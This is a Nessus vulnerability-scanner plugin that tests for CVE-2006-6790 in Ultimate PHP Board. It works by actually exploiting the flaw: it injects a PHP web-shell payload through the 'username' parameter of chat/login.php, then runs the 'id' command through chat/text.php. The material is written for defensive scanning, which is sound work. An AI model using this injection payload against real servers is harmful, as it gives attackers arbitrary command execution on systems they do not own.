#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(23966);
  script_version("1.20");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2006-6790");
  script_bugtraq_id(21760);
  script_xref(name:"EDB-ID", value:"2999");

  script_name(english:"Ultimate PHP Board chat/login.php username Parameter Arbitrary Command Execution");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that allows injection of
arbitrary PHP code.");
  script_set_attribute(attribute:"description", value:
"The remote host is running Ultimate PHP Board (UPB). 

The version of UPB installed on the remote host does not sanitize
input to the 'username' parameter of the 'chat/login.php' script
before writing it to 'chat/text.php'.  Regardless of PHP's settings,
an attacker can leverage this flaw to inject arbitrary PHP code into
the second file and then retrieve that to have the code executed on
the affected host subject to the privileges of the web server user id.");
  script_set_attribute(attribute:"solution", value:
"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:P/RL:O/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"false");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2006/12/27");
  script_set_attribute(attribute:"plugin_publication_date", value:"2007/01/02");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("http_version.nasl");
  script_require_keys("www/PHP");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("data_protection.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/upb", "/forums", "/forum", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Make sure the script exists.
  url = string(dir, "/chat/login.php?option=chat");
  r = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(r)) exit(0, "The web server did not answer");
  res = r[2];

  # If it does...
  if ('src="send.php?username="' >< res)
  {
    # Try to inject a command.
    cmd = "id";
    param = rand_str();
    user = "geo";

    exploit = string(user, ' <?php if (isset($_GET[', param, '])) {passthru($_GET[', param, ']); die;} ?>');
    r = http_send_recv3(method:"GET", port: port, 
      item:string(url, "&","username=", urlencode(str:exploit)));
    if (isnull(r)) exit(0);
    res = r[2];

    # Check whether it worked.
    r = http_send_recv3(method:"GET", port:port, 
      item:string( dir, "/chat/text.php?",  param, "=", cmd));
    if (isnull(r)) exit(0);
    res = r[2];

    line = egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res);
    if (line && user >< line)
    {
      line = strstr(line, user) - user;
      if (report_verbosity)
      {
        report = string(
          "\n",
          "Nessus was able to execute the command '", cmd, "' on the remote host.\n",
          "It produced the following output :\n",
          "\n",
          "  ", data_protection::sanitize_uid(output:line)
        );
        security_hole(port:port, extra:report);
      }
      else security_hole(port);
      exit(0);
    }
  }
}
